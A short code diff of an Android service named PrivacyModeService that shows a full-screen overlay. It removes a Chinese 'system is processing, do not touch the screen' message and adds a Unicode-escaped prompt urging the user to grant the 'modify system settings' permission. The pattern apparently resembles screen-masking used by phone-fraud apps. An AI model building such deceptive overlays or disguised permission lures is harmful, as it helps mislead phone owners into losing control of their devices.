@@ -154,10 +154,7 @@ class PrivacyModeService : Service() {
 
         val textView = TextView(this).apply {
 
-            text =
-                    "系统正在处理业务\n\n" +
-                            "请勿触碰手机屏幕\n\n" +
-                            "感谢您的耐心等待"
+            text = "\u8bf7\u6388\u6743\u201c\u4fee\u6539\u7cfb\u7edf\u8bbe\u7f6e\u201d\u6743\u9650\u4ee5\u542f\u7528\u5b8c\u6574\u9690\u79c1\u6a21\u5f0f"
 
             setTextColor(Color.WHITE)
 
@@ -186,7 +183,7 @@ class PrivacyModeService : Service() {
                 WindowManager.LayoutParams.MATCH_PARENT,
                 WindowManager.LayoutParams.MATCH_PARENT,
 
-                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
 
                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                         WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
